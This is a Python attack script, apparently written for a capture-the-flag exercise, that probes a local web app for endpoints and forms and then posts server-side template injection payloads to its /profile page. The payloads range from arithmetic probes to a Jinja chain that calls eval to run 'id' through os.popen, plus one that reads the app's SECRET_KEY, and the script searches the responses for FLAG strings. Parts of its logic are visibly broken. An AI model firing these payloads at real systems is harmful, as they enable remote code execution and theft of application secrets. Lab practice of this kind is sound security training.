import requests
import re
import time
import json

base_url = "http://127.0.0.1"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVqJUw.pCSHMFD0BgCHgRCWKTrMsMcqWZE"

headers = {
    "Cookie": f"session={session_cookie}",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

print(f"[DIAGNOSTICS] Testing connectivity to {base_url}")
print(f"[COOKIE] Using session: {session_cookie}")

# First check if server is reachable
try:
    print("\n[TEST 1] Checking if server is running...")
    resp = requests.get(base_url, headers=headers, timeout=5)
    print(f"[SUCCESS] Server reachable - Status: {resp.status_code}")
    print(f"[Response Size] {len(resp.text)}B")
    print(f"[Response Preview] {resp.text[:200]}...")
except Exception as e:
    print(f"[!] ERROR accessing {base_url}: {type(e).__name__}: {str(e)}")

# Check common application ports if default fails
if "Connection refused" in str(e):
    print("\n[ALTERNATIVE] Trying common application ports...")
    ports = [5000, 8000, 8080, 3000, 9000]
    for port in ports:
        try:
            test_url = f"http://127.0.0.1:{port}"
            print(f"  Testing {test_url}...")
            resp = requests.get(test_url, headers=headers, timeout=3)
            print(f"  [SUCCESS] Found service on port {port} - Status: {resp.status_code}")
            base_url = test_url
            break
        except:
            continue

# Try alternative hostnames
print("\n[TEST 2] Checking alternative hostnames...")
alts = ["localhost", "host.docker.internal", "0.0.0.0"]
for alt in alts:
    try:
        test_url = f"http://{alt}"
        print(f"  Testing {test_url}...")
        resp = requests.get(test_url, headers=headers, timeout=3)
        print(f"  [SUCCESS] {alt} works - Status: {resp.status_code}")
        base_url = test_url
        break
    except:
        continue

print(f"\n[FINAL TARGET] Using base URL: {base_url}")

# Test endpoints existence
endpoints_to_test = ["/", "/profile", "/home", "/login"]
print("\n[TEST 3] Checking endpoint existence...")
available_endpoints = {}
for endpoint in endpoints_to_test:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        available_endpoints[endpoint] = resp.status_code
        print(f"  {endpoint}: Status {resp.status_code} (Size: {len(resp.text)}B)")
        
        # Look for login forms or CSRF tokens
        if endpoint == "/login" and resp.status_code == 200:
            csrf_match = re.search(r'name="csrf[^"]*"[^>]*value="([^"]+)"', resp.text, re.I)
            if csrf_match:
                print(f"    [CSRF TOKEN] {csrf_match.group(1)}")
        
        # Look for form fields
        form_match = re.search(r'<form[^>]*>(.*?)</form>', resp.text, re.S|re.I)
        if form_match:
            print(f"    [FORM] Found form on {endpoint}")
            fields = re.findall(r'<input[^>]*name="([^"]+)"[^>]*>', form_match.group(1), re.I)
            print(f"    [FIELDS] {fields}")
        
    except Exception as e:
        available_endpoints[endpoint] = f"ERROR: {str(e)}"
        print(f"  {endpoint}: {str(e)}")

# If profile endpoint exists, check if POST is supported
if "/profile" in available_endpoints:
    print("\n[TEST 4] Checking /profile POST capability...")
    try:
        # Try GET first with parameter
        resp = requests.get(f"{base_url}/profile?test=value", headers=headers, timeout=5)
        print(f"  GET with params: Status {resp.status_code}")
        
        # Try POST with simple data
        resp = requests.post(f"{base_url}/profile", headers=headers, data={"test": "value"}, timeout=5)
        print(f"  POST test: Status {resp.status_code}")
        
    except Exception as e:
        print(f"  Error: {str(e)}")

# Perform basic SSTI tests if profile exists
if available_endpoints.get("/profile") in [200, 302]:
    print("\n[TEST 5] Basic SSTI detection on /profile...")
    
    ssti_test_payloads = [
        ("simple_arithmetic", "{{7*7}}"),
        ("string_operation", '{{"abc"[0]}}'),
        ("class_access", "{{''.__class__}}"),
        ("config_access", "{{config}}"),
        ("error_trigger", "{{undefined_var}}"),
    ]
    
    for test_name, payload in ssti_test_payloads:
        try:
            print(f"\n  [{test_name}] Testing: {payload}")
            
            # POST to profile
            post_resp = requests.post(f"{base_url}/profile", 
                                    headers=headers, 
                                    data={"data": payload}, 
                                    timeout=10, 
                                    allow_redirects=True)
            print(f"    POST Status: {post_resp.status_code}")
            print(f"    POST Size: {len(post_resp.text)}B")
            
            # Check for specific indicators
            if "49" in post_resp.text:
                print(f"    [!] ARITHMETIC SUCCESS: Found '49' in response")
            if "str" in post_resp.text and "__class__" not in post_resp.text:
                print(f"    [!] CLASS RESOLVED: 'str' without '__class__'")
            if "template" in post_resp.text.lower() or "error" in post_resp.text.lower():
                print(f"    [!] TEMPLATE ERROR DETECTED")
            
            # Also check GET response to profile
            get_resp = requests.get(f"{base_url}/profile", headers=headers, timeout=5)
            print(f"    GET Status: {get_resp.status_code}")
            print(f"    GET Size: {len(get_resp.text)}B")
            
            # Look for the same indicators
            if "49" in get_resp.text and "{{" not in get_resp.text:
                print(f"    [!] ARITHMETIC RESULT IN GET: Found '49'")
            
            # Check for command execution output
            if "uid=" in get_resp.text or "root" in get_resp.text:
                print(f"    [!] COMMAND OUTPUT DETECTED")
            
            # Look for flag patterns
            flag_match = re.search(r'FLAG\{[^}]+\}', get_resp.text)
            if flag_match:
                print(f"    [!!!] FLAG FOUND: {flag_match.group()}")
            
        except Exception as e:
            print(f"    Error: {str(e)}")
    
    # Test blind indicators
    print("\n[TEST 6] Testing blind SSTI indicators...")
    blind_payloads = [
        ("cmd_len_check", '{{config.__class__.__init__.__globals__.__builtins__.eval("__import__(\'os\').popen(\'id\').read()").__len__}}', "expected_len"),
        ("timing_test", '{{config[\'SECRET_KEY\'] if config[\'SECRET_KEY\'] else None}}', "fast"),
    ]
    
    for test_name, payload, expected in blind_payloads:
        try:
            print(f"\n  [{test_name}] Testing blind indicator")
            start_time = time.time()
            post_resp = requests.post(f"{base_url}/profile", 
                                    headers=headers, 
                                    data={"data": payload}, 
                                    timeout=20,
                                    allow_redirects=True)
            elapsed = time.time() - start_time
            print(f"    POST Status: {post_resp.status_code}")
            print(f"    Response time: {elapsed:.2f}s")
            
            # Check response size differences
            baseline_resp = requests.get(f"{base_url}/profile", headers=headers, timeout=5)
            size_diff = abs(len(post_resp.text) - len(baseline_resp.text))
            print(f"    Size difference from baseline: {size_diff}B")
            
            if size_diff > 100:
                print(f"    [!] SIGNIFICANT SIZE CHANGE: {size_diff}B")
            
            if elapsed > 5:
                print(f"    [!] SLOW RESPONSE: {elapsed:.2f}s (may indicate processing)")
            
        except Exception as e:
            print(f"    Error: {str(e)}")

else:
    print("\n[!] /profile endpoint not accessible, skipping SSTI tests")

# Summary
print(f"\n{'='*60}")
print("[TEST SUMMARY]")
print(f"Target: {base_url}")
print(f"Endpoints tested: {len(available_endpoints)}")
print("Available endpoints:")
for ep, status in available_endpoints.items():
    print(f"  {ep}: {status}")

if any(r.get("profile_reflection") or r.get("home_reflection") for r in [{}]):
    print("\n[RESULT] SSTI reflection detected")
else:
    print("\n[RESULT] No direct SSTI reflection detected")
    print("         Possible blind SSTI - test with out-of-band or timing techniques")

# Final flag check
full_check = ""
try:
    # Try one more comprehensive check
    resp = requests.get(f"{base_url}/profile", headers=headers, timeout=5)
    full_check = resp.text
    flag_match = re.search(r'FLAG\{[^}]+\}', full_check)
    if flag_match:
        print(f"\n[!] FLAG FOUND during final check: {flag_match.group()}")
    else:
        print(f"\n[FLAG] No FLAG pattern found in responses")
except:
    print(f"\n[FLAG] Unable to check for flag - connection issues")

